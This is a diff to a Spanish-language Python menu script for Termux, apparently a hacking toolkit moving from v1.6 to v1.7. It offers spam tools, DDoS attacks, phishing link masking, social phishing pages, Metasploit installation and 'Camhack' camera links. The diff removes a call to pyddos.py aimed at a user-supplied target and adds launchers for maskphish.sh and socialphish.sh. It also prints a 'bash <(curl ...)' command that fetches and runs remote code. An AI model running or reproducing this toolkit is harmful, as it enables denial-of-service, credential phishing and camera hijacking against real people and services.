@@ -1,7 +1,7 @@
 while True:
     import shlex, subprocess
     import time
-    command_line = ' apt-get install git vim nano clang nmap wget weechat unzip termux-api screenfetch unstable-repo root-repo python bash curl neofetch hydra gzip game-repo fish figlet dpkg dos2unix apt apache2 dnsutils tsu pip -y'
+    command_line = ' apt-get install git vim nano clang nmap wget weechat unzip termux-api screenfetch unstable-repo root-repo python bash curl neofetch hydra gzip game-repo fish figlet dpkg dos2unix apt apache2 dnsutils tsu irssi -y'
     args = shlex.split(command_line)
 
     command_line3 = ' pkg uninstall ruby -y'
@@ -17,13 +17,13 @@ while True:
 ▀█▀ ▄▀▀▄ ▄▀▀▄  █░░   █░█ ▀█▀ ▀█▀
 ░█░ █░░█ █░░█  █░░   █▀▄ ░█░ ░█░
 ░▀░ ░▀▀░ ░▀▀░░ ▀▀▀   ▀░▀ ▀▀▀ ░▀░
-v- 1.6     """)
+v- 1.7     """)
     print("Codded by; @Jm")
     print("\033[32m")
     print("""
-    [1] Instalador de paquetes      [4] Ataques DDoS(No root)
-    [2] Herramientas de spam        [5] Metasploit
-    [3] Ataques DDoS(root)          [6] Extractores de información         
+    [1] Instalador de paquetes      [2] Herramientas de spam
+    [3] Ocultar enlaces(phishing )  [4] Ataques DDoS
+    [5] Metasploit                  [6] Extractores de información
     [7] Camhack(Enlaces de camras)  [8] Phishing
 
                             [0] Salir """)
@@ -55,22 +55,8 @@ v- 1.6     """)
     
     elif eligio=="3":
         subprocess.call(['clear'],shell=True)
-        print("\033[35m")
-        print("""
-██████╗░██████╗░░█████╗░░██████╗
-██╔══██╗██╔══██╗██╔══██╗██╔════╝
-██║░░██║██║░░██║██║░░██║╚█████╗░
-██║░░██║██║░░██║██║░░██║░╚═══██╗
-██████╔╝██████╔╝╚█████╔╝██████╔╝
-╚═════╝░╚═════╝░░╚════╝░╚═════╝░
-(ROOT)            """)
-        aprint("\033[39m")
-        subprocess.call(['cd', 'herramientas'],shell=True)
-        enlace = input("\nIntroduce el enlace (Sin Http/https): ")
-        command_line2 = 'python pyddos.py -d' + enlace + '-p 80 -T 5000 -Pyslow'
-        args2 = shlex.split(command_line2)
-        subprocess.call(args2)
-
+        subprocess.call(['cd quack-hammer-sherlock/maskphish && bash maskphish.sh '],shell=True)
+        break
     elif eligio=="4":
         subprocess.call(['clear'],shell=True)
         print("\033[36m")
@@ -135,18 +121,27 @@ v- 1.6     """)
             time.sleep(1)
             print("Sucess!!!")
             subprocess.call(args3)
-            print(''''\n \nIntroduce este comando: bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2 \n''')
-            time.sleep(2)
+            print("""
+
+
+            
+            Introduce este comando: bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2 
+
+            """)
+            
             break
 
         elif opcion=="2":
             subprocess.call(['clear'],shell=True)
             subprocess.call(['pkg install unstable-repo -y'],shell=True)
             subprocess.call(['pkg install metasploit -y'],shell=True)
-            break
+            print("Hecho!!")
+            time.sleep(1.3)
+
         elif opcion=="3":
             subprocess.call(['termux-open https://academia-hacker.com/metasploit-framework/'],shell=True)
-            break
+            time.sleep(1.3)
+
         elif opcion=="4":
             print("")
 
@@ -202,6 +197,12 @@ v- 1.6     """)
         num_elegido=input("Elige una opción: ")
         if num_elegido == "1":
             subprocess.call(['clear'],shell=True)
+            print("""
+
+                    Recomendación: Abre otra sesión y utiliza la opción 3 de Tool Kit
+
+                    """)
+            time.sleep(2)
             subprocess.call(['cd quack-hammer-sherlock && bash socialphish.sh'],shell=True)
             break
 
